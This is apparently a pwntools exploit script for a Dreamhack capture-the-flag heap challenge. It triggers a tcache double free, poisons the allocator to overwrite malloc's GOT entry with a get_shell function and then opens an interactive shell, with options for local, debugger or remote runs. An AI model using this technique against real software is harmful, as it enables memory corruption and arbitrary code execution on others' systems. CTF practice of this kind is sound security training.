#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./tcache_dup_patched', checksec=False)

libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

gs = """
decompiler connect ida --host 172.19.176.1 --port 3662
b *main

b *create+87
b *create+175

b *delete+91
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 21181)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def create(size, data):
    sl(b'1')
    sla(b'Size: ', str(size).encode())
    sla(b'Data: ', data)
    io.recvuntil(b'> ')

def delete(index):
    sl(b'2')
    sla(b'idx: ', str(index).encode())
    io.recvuntil(b'> ')

io = start()
io.recvuntil(b'> ')

create(0x18, b'Hello')
create(0x18, b'world')

#Double FREE
delete(0)
delete(1)
delete(0)

#overwrite malloc got table
create(0x18, pack(elf.got['malloc']))
create(0x18, b'garbage1')
create(0x18, b'garbage2')

create(0x18, pack(elf.sym['get_shell']))
io.interactive()